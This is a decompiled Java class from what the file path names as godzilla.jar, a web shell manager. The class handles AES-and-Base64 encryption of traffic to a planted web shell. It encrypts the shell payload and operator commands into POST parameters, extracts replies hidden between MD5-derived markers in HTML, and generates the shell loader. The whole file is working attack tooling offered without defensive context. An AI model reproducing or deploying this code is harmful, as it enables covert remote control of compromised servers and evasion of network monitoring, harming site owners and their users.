/*    */ package shells.cryptions.JavaAes;
/*    */ 
/*    */ import core.imp.Cryption;
/*    */ import core.shell.ShellEntity;
/*    */ import java.net.URLEncoder;
/*    */ import javax.crypto.Cipher;
/*    */ import javax.crypto.spec.SecretKeySpec;
/*    */ import util.Log;
/*    */ import util.functions;
/*    */ import util.http.Http;
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ public class JavaAesBase64Ex
/*    */   implements Cryption
/*    */ {
/*    */   private ShellEntity shell;
/*    */   private Http http;
/*    */   private Cipher decodeCipher;
/*    */   private Cipher encodeCipher;
/*    */   private String key;
/*    */   private boolean state;
/*    */   private byte[] payload;
/*    */   private String findStrLeft;
/*    */   private String pass;
/*    */   private String findStrRight;
/*    */   
/*    */   public void init(ShellEntity context) {
/* 30 */     this.shell = context;
/* 31 */     this.http = this.shell.getHttp();
/* 32 */     this.key = this.shell.getSecretKeyX();
/* 33 */     this.pass = this.shell.getPassword();
/* 34 */     String findStrMd5 = functions.md5(this.pass + this.key);
/* 35 */     this.findStrLeft = findStrMd5.substring(0, 16).toUpperCase();
/* 36 */     this.findStrRight = findStrMd5.substring(16).toUpperCase();
/*    */     try {
/* 38 */       this.encodeCipher = Cipher.getInstance("AES");
/* 39 */       this.decodeCipher = Cipher.getInstance("AES");
/* 40 */       this.encodeCipher.init(1, new SecretKeySpec(this.key.getBytes(), "AES"));
/* 41 */       this.decodeCipher.init(2, new SecretKeySpec(this.key.getBytes(), "AES"));
/* 42 */       this.payload = this.shell.getPayloadModule().getPayload();
/* 43 */       if (this.payload != null) {
/* 44 */         this.state = true;
/*    */       } else {
/* 46 */         Log.error("payload Is Null");
/*    */       }
/*    */     
/* 49 */     } catch (Exception e) {
/* 50 */       Log.error(e);
/*    */       return;
/*    */     } 
/*    */   }
/*    */ 
/*    */ 
/*    */   
/*    */   public byte[] encode(byte[] data) {
/*    */     try {
/* 59 */       return (this.pass + "=" + URLEncoder.encode(functions.base64EncodeToString(this.encodeCipher.doFinal(this.payload))) + "&" + this.pass + "W=" + URLEncoder.encode(functions.base64EncodeToString(this.encodeCipher.doFinal(data)))).getBytes();
/* 60 */     } catch (Exception e) {
/* 61 */       Log.error(e);
/* 62 */       return null;
/*    */     } 
/*    */   }
/*    */ 
/*    */ 
/*    */   
/*    */   public byte[] decode(byte[] data) {
/*    */     try {
/* 70 */       data = functions.base64Decode(findStr(data));
/* 71 */       return this.decodeCipher.doFinal(data);
/* 72 */     } catch (Exception e) {
/* 73 */       Log.error(e);
/* 74 */       return null;
/*    */     } 
/*    */   }
/*    */   
/*    */   public String findStr(byte[] respResult) {
/* 79 */     String htmlString = new String(respResult);
/* 80 */     return functions.subMiddleStr(htmlString, this.findStrLeft, this.findStrRight);
/*    */   }
/*    */ 
/*    */ 
/*    */   
/*    */   public boolean isSendRLData() {
/* 86 */     return true;
/*    */   }
/*    */ 
/*    */ 
/*    */ 
/*    */   
/*    */   public boolean check() {
/* 93 */     return this.state;
/*    */   }
/*    */ 
/*    */ 
/*    */   
/*    */   public byte[] generate(String password, String secretKey) {
/* 99 */     return Generate.GenerateShellLoder("JavaShellEx", password, functions.md5(secretKey).substring(0, 16), false);
/*    */   }
/*    */ }


/* Location:              C:\User\\user\Downloads\godzilla.jar!\shells\cryptions\JavaAes\JavaAesBase64Ex.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */